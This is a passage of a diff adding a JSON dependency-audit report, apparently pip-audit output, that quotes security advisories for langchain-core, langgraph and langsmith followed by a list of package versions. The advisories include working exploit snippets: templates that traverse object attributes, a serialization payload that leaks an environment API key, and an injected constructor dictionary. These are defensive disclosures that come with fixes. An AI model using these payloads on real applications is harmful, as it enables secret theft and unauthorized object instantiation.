[(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates - **Reserve Jinja2 for trusted sources** - Only use Jinja2 templates when you fully control the template content  ## Update: Jinja2 Restrictions Reverted  The Jinja2 hardening introduced in the initial patch has been **reverted as of `langchain-core` 1.1.3**. The restriction was not addressing a direct vulnerability but was part of broader defensive hardening. In practice, it significantly limited legitimate Jinja2 usage and broke existing templates. Since Jinja2 is intended to be used only with **trusted template sources**, the original behavior has been restored. Users should continue to avoid accepting untrusted template strings when using Jinja2, but no security issue exists with trusted templates.",
+          "fix_versions": [
+            "0.3.80",
+            "1.0.7"
+          ],
+          "id": "GHSA-6qv9-48xg-fc7f"
+        },
+        {
+          "aliases": [
+            "CVE-2025-68664"
+          ],
+          "description": "## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:  1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.  ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=\"core\"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version=\"v1\")`** \u2014 The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=\"v2\")` is not vulnerable. 2. **Use `Runnable.astream_log()`** \u2014 This method internally uses vulnerable serialization for streaming outputs. 3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** \u2014 Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** \u2014 Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** \u2014 Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**. 9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{\"lc\": 1, \"type\": \"secret\", \"id\": [\"ENV_VAR\"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default) - LLM responses in `additional_kwargs` can be controlled via prompt injection  ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     \"user_data\": {         \"lc\": 1,         \"type\": \"secret\",         \"id\": [\"OPENAI_API_KEY\"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ[\"OPENAI_API_KEY\"] = \"sk-secret-key-12345\" deserialized = load(serialized, secrets_from_env=True)  print(deserialized[\"user_data\"])  # \"sk-secret-key-12345\" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization. 2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass]) ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:  ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True) ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev",
+          "fix_versions": [
+            "0.3.81",
+            "1.2.5"
+          ],
+          "id": "GHSA-c67j-w6g6-q2cm"
+        },
+        {
+          "aliases": [
+            "CVE-2026-26013"
+          ],
+          "description": "## Server-Side Request Forgery (SSRF) in ChatOpenAI Image Token Counting  ### Summary The `ChatOpenAI.get_num_tokens_from_messages()` method fetches arbitrary `image_url` values without validation when computing token counts for vision-enabled models. This allows attackers to trigger Server-Side Request Forgery (SSRF) attacks by providing malicious image URLs in user input.  ### Severity **Low** - The vulnerability allows SSRF attacks but has limited impact due to: - Responses are not returned to the attacker (blind SSRF) - Default 5-second timeout limits resource exhaustion - Non-image responses fail at PIL image parsing  ### Impact An attacker who can control image URLs passed to `get_num_tokens_from_messages()` can: - Trigger HTTP requests from the application server to arbitrary internal or external URLs - Cause the server to access internal network resources (private IPs, cloud metadata endpoints) - Cause minor resource consumption through image downloads (bounded by timeout)  **Note:** This vulnerability occurs during token counting, which may happen outside of model invocation (e.g., in logging, metrics, or token budgeting flows).  ### Details The vulnerable code path: 1. `get_num_tokens_from_messages()` processes messages containing `image_url` content blocks 2. For images without `detail: \"low\"`, it calls `_url_to_size()` to fetch the image and compute token counts 3. `_url_to_size()` performs `httpx.get(image_source)` on any URL without validation 4. Prior to the patch, there was no SSRF protection, size limits, or explicit timeout  **File:** `libs/partners/openai/langchain_openai/chat_models/base.py`  ### Patches The vulnerability has been patched in `langchain-openai==1.1.9` (requires `langchain-core==1.2.11`).  The patch adds: 1. **SSRF validation** using `langchain_core._security._ssrf_protection.validate_safe_url()` to block:    - Private IP ranges (RFC 1918, loopback, link-local)    - Cloud metadata endpoints (169.254.169.254, etc.)    - Invalid URL schemes 2. **Explicit size limits** (50 MB maximum, matching OpenAI's payload limit) 3. **Explicit timeout** (5 seconds, same as `httpx.get` default) 4. **Allow disabling image fetching** via `allow_fetching_images=False` parameter  ### Workarounds If you cannot upgrade immediately:  1. **Sanitize input:** Validate and filter `image_url` values before passing messages to token counting or model invocation 2. **Use network controls:** Implement egress filtering to prevent outbound requests to private IPs",
+          "fix_versions": [
+            "1.2.11"
+          ],
+          "id": "GHSA-2g6r-c272-w58r"
+        },
+        {
+          "aliases": [
+            "CVE-2026-40087"
+          ],
+          "description": "LangChain's f-string prompt-template validation was incomplete in two respects.  First, some prompt template classes accepted f-string templates and formatted them without enforcing the same attribute-access validation as `PromptTemplate`. In particular, `DictPromptTemplate` and `ImagePromptTemplate` could accept templates containing attribute access or indexing expressions and subsequently evaluate those expressions during formatting.  Examples of the affected shape include:  ```python \"{message.additional_kwargs[secret]}\" \"https://example.com/{image.__class__.__name__}.png\" ```  Second, f-string validation based on parsed top-level field names did not reject nested replacement fields inside format specifiers. For example:  ```python \"{name:{name.__class__.__name__}}\" ```  In this pattern, the nested replacement field appears in the format specifier rather than in the top-level field name. As a result, earlier validation based on parsed field names did not reject the template even though Python formatting would still attempt to resolve the nested expression at runtime.  ## Affected usage  This issue is only relevant for applications that accept untrusted template strings, rather than only untrusted template variable values.  In addition, practical impact depends on what objects are passed into template formatting:  - If applications only format simple values such as strings and numbers, impact is limited and may only result in formatting errors. - If applications format richer Python objects, attribute access and indexing may interact with internal object state during formatting.  In many deployments, these conditions are not commonly present together. Applications that allow end users to author arbitrary templates often expose only a narrow set of simple template variables, while applications that work with richer internal Python objects often keep template structure under developer control. As a result, the highest-impact scenario is plausible but is not representative of all LangChain applications.  Applications that use hardcoded templates or that only allow users to provide variable values are not affected by this issue.  ## Impact  The direct issue in `DictPromptTemplate` and `ImagePromptTemplate` allowed attribute access and indexing expressions to survive template construction and then be evaluated during formatting. When richer Python objects were passed into formatting, this could expose internal fields or nested data to prompt output, model context, or logs.  The nested format-spec issue is narrower in scope. It bypassed the intended validation rules for f-string templates, but in simple cases it results in an invalid format specifier error rather than direct disclosure. Accordingly, its practical impact is lower than that of direct top-level attribute traversal.  Overall, the practical severity depends on deployment. Meaningful confidentiality impact requires attacker control over the template structure itself, and higher impact further depends on the surrounding application passing richer internal Python objects into formatting.  ## Fix  The fix consists of two changes.  First, LangChain now applies f-string safety validation consistently to `DictPromptTemplate` and `ImagePromptTemplate`, so templates containing attribute access or indexing expressions are rejected during construction and deserialization.  Second, LangChain now rejects nested replacement fields inside f-string format specifiers.  Concretely, LangChain validates parsed f-string fields and raises an error for:  - variable names containing attribute access or indexing syntax such as `.` or `[]` - format specifiers containing `{` or `}`  This blocks templates such as:  ```python \"{message.additional_kwargs[secret]}\" \"https://example.com/{image.__class__.__name__}.png\" \"{name:{name.__class__.__name__}}\" ```  The fix preserves ordinary f-string formatting features such as standard format specifiers and conversions, including examples like:  ```python \"{value:.2f}\" \"{value:>10}\" \"{value!r}\" ```  In addition, the explicit template-validation path now applies the same structural f-string checks before performing placeholder validation, ensuring that the security checks and validation checks remain aligned.",
+          "fix_versions": [
+            "0.3.84",
+            "1.2.28"
+          ],
+          "id": "GHSA-926x-3r5x-gfhw"
+        },
+        {
+          "aliases": [
+            "CVE-2026-44843"
+          ],
+          "description": "LangChain contains older runtime code paths that deserialize run inputs, run outputs, or other application-controlled payloads using overly broad object allowlists. These paths may call `load()` with `allowed_objects=\"all\"`. This does not enable arbitrary Python object deserialization, but it does allow any trusted LangChain-serializable object to be revived, which is broader than these runtime paths require. As a result, attacker-supplied LangChain serialized constructor dictionaries may cause trusted runtime paths to instantiate classes with untrusted constructor arguments.  Applications are exposed only when all of the following are true:  1. The application accepts untrusted structured input, such as JSON, from a user or network request. 2. The application does not validate or canonicalize that input into an inert schema before invoking LangChain. 3. Attacker-controlled nested dictionaries or lists are preserved in LangChain run inputs or outputs. 4. The application uses an affected API path that later deserializes that run data.  Known affected runtime surfaces include:  - `RunnableWithMessageHistory` - `astream_log()` - `astream_events(version=\"v1\")`  Related unsafe deserialization patterns may also affect applications that explicitly load serialized LangChain prompt or runnable objects from untrusted sources, including shared prompt stores, Hub artifacts with model configuration, or other application-controlled serialization stores.  Applications that validate incoming requests against a fixed schema, such as coercing user input to a plain string or message-content field before invoking LangChain, are unlikely to expose this deserialization primitive.  This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -> `loads()` round-trips and reach LangChain object revival logic.  ## Impact  An attacker who can submit untrusted structured input to an affected application, and have that structure preserved in LangChain run data, may be able to inject LangChain serialized constructor payloads such as:  ```json {   \"lc\": 1,   \"type\": \"constructor\",   \"id\": [\"langchain_core\", \"messages\", \"ai\", \"AIMessage\"],   \"kwargs\": {\"content\": \"attacker-controlled content\"} } ```  If this payload reaches a broad `load()` call, LangChain may instantiate the referenced class instead of treating the payload as inert user data.  Realistic impacts include:  - Persistent chat-history poisoning when revived `AIMessage`, `HumanMessage`, or `SystemMessage` objects are stored by `RunnableWithMessageHistory`. - Prompt injection or behavior manipulation if attacker-controlled messages are later included in model context. - Instantiation of unexpected trusted LangChain objects with attacker-controlled constructor arguments. - Possible credential disclosure or server-side requests if a reachable object reads environment credentials, creates clients, or contacts attacker-controlled endpoints during initialization. - Additional prompt-template or runnable-configuration impacts in applications that separately load and execute untrusted serialized LangChain objects.  ## Remediation  LangChain will deprecate the affected APIs as part of this fix:  - `RunnableWithMessageHistory` - `astream_log()` - `astream_events(version=\"v1\")`  These are older code paths that are no longer recommended for new applications. They were not previously marked as deprecated, but recent LangChain documentation has primarily directed users toward newer streaming and memory patterns, including the `stream` API. Applications should migrate to the currently recommended APIs rather than continue depending on these older surfaces.  Separately, LangChain will update `load()` and `loads()` to tighten deserialization behavior so broad object revival is not applied implicitly to untrusted or application-controlled payloads. The older runtime surfaces listed above are being deprecated rather than preserved as supported paths for broad runtime deserialization.  This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (`_is_lc_secret`). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during `dumps()` -> `loads()` round-trips and reach LangChain object revival logic.  ## Guidance for `load()` and `loads()`  `load()` and `loads()` should be used only with trusted LangChain manifests or serialized objects from trusted storage. Do not pass user-controlled data to `load()` or `loads()`, and do not use them as general parsers for request bodies, tool inputs, chat messages, or other attacker-controlled data.  `load()` and `loads()` are beta APIs, and their behavior may change as LangChain narrows unsafe defaults. Future LangChain versions will require callers to be explicit about which objects may be revived. Users should pass a narrow `allowed_objects` value appropriate for the specific trusted manifest they are loading, rather than relying on broad defaults or `allowed_objects=\"all\"`, which permits the full trusted LangChain serialization allowlist.  ## Credits  The original issue was first reported by @u-ktdi.  Similar findings were reported by @dewankpant, @shrutilohani, @Moaaz-0x, @pucagit.  A related `_is_lc_secret` marker bypass affecting `dumps()` -> `loads()` round-trips was reported by @yardenporat353 (and a similar report by @localhost-detect)",
+          "fix_versions": [
+            "0.3.85",
+            "1.3.3"
+          ],
+          "id": "GHSA-pjwx-r37v-7724"
+        }
+      ]
+    },
+    {
+      "name": "langgraph",
+      "version": "0.0.55",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-28277"
+          ],
+          "description": "LangGraph checkpointers can load msgpack-encoded checkpoints that reconstruct Python objects during deserialization. If an attacker can modify checkpoint data in the backing store (for example, after a database compromise or other privileged write access to the persistence layer), they can potentially supply a crafted payload that triggers unsafe object reconstruction when the checkpoint is loaded.  This is a **post-exploitation / defense-in-depth** issue. Exploitation requires the ability to write attacker-controlled checkpoint bytes at rest. In most deployments that prerequisite already implies a serious incident; the additional risk is turning \u201ccheckpoint-store write access\u201d into code execution in the application runtime, which can expand blast radius (for example by exposing environment variables or cloud credentials available to the runtime).  There is no evidence of exploitation in the wild, and LangGraph is not aware of a practical exploitation path in existing deployments today. This change is intended to reduce the blast radius of a checkpoint-store compromise.  ## Affected users / systems  Users may be affected if they:  - use a persistent checkpointer (database, remote store, shared filesystem, etc.), - load/resume from checkpoints, and - operate in an environment where an attacker could gain privileged write access to checkpoint data in the backing store.  This issue requires the attacker to be able to modify persisted checkpoint bytes (or to compromise a trusted component that writes them). It is generally not reachable by an unauthenticated remote attacker in a correctly configured deployment.  ## Impact - Potential **arbitrary code execution** or other unsafe side effects during checkpoint deserialization. - Escalation from \u201cwrite access to checkpoint store\u201d to \u201ccode execution in the application runtime,\u201d which may expose runtime secrets or provide access to other systems the runtime can reach.  ## Exploitation scenario (high level) 1. Attacker gains privileged write access to the checkpoint store (for example, via database compromise, leaked credentials, or abuse of an administrative data path). 2. Attacker writes a crafted checkpoint payload containing msgpack data intended to reconstruct dangerous objects. 3. Application resumes and deserializes the checkpoint; unsafe reconstruction could execute attacker-controlled behavior.  ## Mitigation / remediation LangGraph provides an allowlist-based hardening mechanism for msgpack checkpoint deserialization.  ### Strict mode (environment variable) - **`LANGGRAPH_STRICT_MSGPACK`**   - When set truthy (`1`, `true`, `yes`), the default msgpack deserialization policy becomes strict.   - Concretely: `JsonPlusSerializer()` will default `allowed_msgpack_modules` to `None` (strict) instead of `True` (warn-and-allow), unless `allowed_msgpack_modules=...` is explicitly passed.  ### `allowed_msgpack_modules` (serializer/checkpointer config) This setting controls what msgpack \u201cext\u201d types are allowed to be reconstructed.  - `True` (default when strict mode is not enabled): allow all ext types, but log a warning when deserializing a type that is not explicitly registered. - `None` (strict): only a built-in safe set is reconstructed; other ext types are blocked. - `[(module, class_name), ...]` (strict allowlist): the built-in safe set plus exactly the listed symbols are reconstructed (exact-match).  ### Built-in safe set A small set of types is always treated as safe to reconstruct (for example `datetime` types, `uuid.UUID`, `decimal.Decimal`, `set`/`frozenset`/`deque`, `ipaddress` types, `pathlib` paths, `zoneinfo.ZoneInfo`, compiled regex patterns, and selected LangGraph internal types).  ### Automatically derived allowlist (only when compiling graphs) When `LANGGRAPH_STRICT_MSGPACK` is enabled and `StateGraph` is compiled, LangGraph derives an allowlist from the graph\u2019s schemas and channels and applies it to the checkpointer.  - The allowlist is built by walking the state/input/output/context schemas (plus node/branch input schemas) and channel value/update types. It includes Pydantic v1/v2 models, dataclasses, enums, TypedDict field types, and common typing constructs (containers, unions, `Annotated`). - LangGraph also includes a curated set of common LangChain message classes.  This derived allowlist is only applied if the selected checkpointer supports `with_allowlist(...)`. If a user is constructing serializers/checkpointers manually (or using a checkpointer that does not support allowlist propagation), they will need to configure `allowed_msgpack_modules` themselves.  ### Operational guidance - Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if compromise is suspected. - Enable strict mode (`LANGGRAPH_STRICT_MSGPACK=true`) in production if feasible, and rely on schema-driven allowlisting to reduce incompatibilities. - Avoid providing custom msgpack deserialization hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.  ## Limitations / important notes - If a checkpointer implementation does **not** support allowlist application (i.e., does not implement `with_allowlist`), allowlist enforcement may be skipped (with a warning). In that situation, strict expectations may not hold. - If an application supplies a custom msgpack unpack hook (`ext_hook`), the custom hook controls reconstruction and can bypass the default allowlist checks (intentional escape hatch, but it weakens the protection).  ## LangSmith / hosted deployments note LangSmith is not aware of this issue presenting risk to existing LangSmith-hosted deployments. The described threat model requires an attacker to tamper with the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.  First reported by:  yardenporat353",
+          "fix_versions": [
+            "1.0.10"
+          ],
+          "id": "GHSA-g48c-2wqr-h844"
+        }
+      ]
+    },
+    {
+      "name": "langsmith",
+      "version": "0.1.147",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-41182"
+          ],
+          "description": "## Summary  The LangSmith SDK's output redaction controls (hideOutputs in JS, hide_outputs in Python) do not apply to streaming token events. When an LLM run produces streaming output, each chunk is recorded as a new_token event containing the raw token value. These events bypass the redaction pipeline entirely \u2014 prepareRunCreateOrUpdateInputs (JS) and _hide_run_outputs (Python) only process the inputs and outputs fields on a run, never the events array. As a result, applications relying on output redaction to prevent sensitive LLM output from being stored in LangSmith will still leak the full streamed content via run events.  ## Details  **Both JS and Python SDKs are affected.** The same pattern exists in both:  - **JS SDK**: `traceable.ts:997-1003` and `traceable.ts:1044-1050` - **Python SDK**: `run_helpers.py:1924` and `run_helpers.py:1996`  In both SDKs, `new_token` events with raw `kwargs.token` values are added during streaming, and the redaction pipeline (`hideOutputs` in JS, `hide_outputs` in Python) only processes `inputs`/`outputs` \u2014 never `events`.",
+          "fix_versions": [
+            "0.7.31"
+          ],
+          "id": "GHSA-rr7j-v2q5-chgv"
+        }
+      ]
+    },
+    {
+      "name": "license-expression",
+      "version": "30.4.4",
+      "vulns": []
+    },
+    {
+      "name": "locust",
+      "version": "2.29.0",
+      "vulns": []
+    },
+    {
+      "name": "markdown-it-py",
+      "version": "4.2.0",
+      "vulns": []
+    },
+    {
+      "name": "markupsafe",
+      "version": "3.0.3",
+      "vulns": []
+    },
+    {
+      "name": "mdurl",
+      "version": "0.1.2",
+      "vulns": []
+    },
+    {
+      "name": "mmh3",
+      "version": "5.2.1",
+      "vulns": []
+    },
+    {
+      "name": "mpmath",
+      "version": "1.3.0",
+      "vulns": []
+    },
+    {
+      "name": "msgpack",
+      "version": "1.1.2",
+      "vulns": []
+    },
+    {
+      "name": "mypy",
+      "version": "1.10.0",
+      "vulns": []
+    },
+    {
+      "name": "mypy-extensions",
+      "version": "1.1.0",
+      "vulns": []
+    },
+    {
+      "name": "networkx",
+      "version": "3.6.1",
+      "vulns": []
+    },
+    {
+      "name": "numpy",
+      "version": "1.26.4",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cublas",
+      "version": "13.1.0.3",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cuda-cupti",
+      "version": "13.0.85",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cuda-nvrtc",
+      "version": "13.0.88",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cuda-runtime",
+      "version": "13.0.96",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cudnn-cu13",
+      "version": "9.19.0.56",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cufft",
+      "version": "12.0.0.61",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cufile",
+      "version": "1.15.1.6",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-curand",
+      "version": "10.4.0.35",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cusolver",
+      "version": "12.0.4.66",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cusparse",
+      "version": "12.6.3.3",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-cusparselt-cu13",
+      "version": "0.8.0",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-nccl-cu13",
+      "version": "2.28.9",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-nvjitlink",
+      "version": "13.0.88",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-nvshmem-cu13",
+      "version": "3.4.5",
+      "vulns": []
+    },
+    {
+      "name": "nvidia-nvtx",
+      "version": "13.0.85",
+      "vulns": []
+    },
+    {
+      "name": "oauthlib",
+      "version": "3.3.1",
+      "vulns": []
+    },
+    {
+      "name": "onnxruntime",
+      "version": "1.26.0",
+      "vulns": []
+    },
+    {
+      "name": "openai",
+      "version": "1.30.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-api",
+      "version": "1.41.1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-common",
+      "version": "1.41.1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-grpc",
+      "version": "1.41.1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation",
+      "version": "0.62b1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-asgi",
+      "version": "0.62b1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-fastapi",
+      "version": "0.62b1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-proto",
+      "version": "1.41.1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-sdk",
+      "version": "1.41.1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-semantic-conventions",
+      "version": "0.62b1",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-util-http",
+      "version": "0.62b1",
+      "vulns": []
+    },
+    {
+      "name": "orjson",
+      "version": "3.11.9",
+      "vulns": []
+    },
+    {
+      "name": "overrides",
+      "version": "7.7.0",
+      "vulns": []
+    },
+    {
+      "name": "packageurl-python",
+      "version": "0.17.6",
+      "vulns": []
+    },
+    {
+      "name": "packaging",
+      "version": "24.2",
+      "vulns": []
+    },
+    {
+      "name": "pathspec",
+      "version": "1.1.1",
+      "vulns": []
+    },
+    {
+      "name": "pillow",
+      "version": "12.2.0",
+      "vulns": []
+    },
+    {
+      "name": "pip",
+      "version": "24.0",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2025-8869"
+          ],
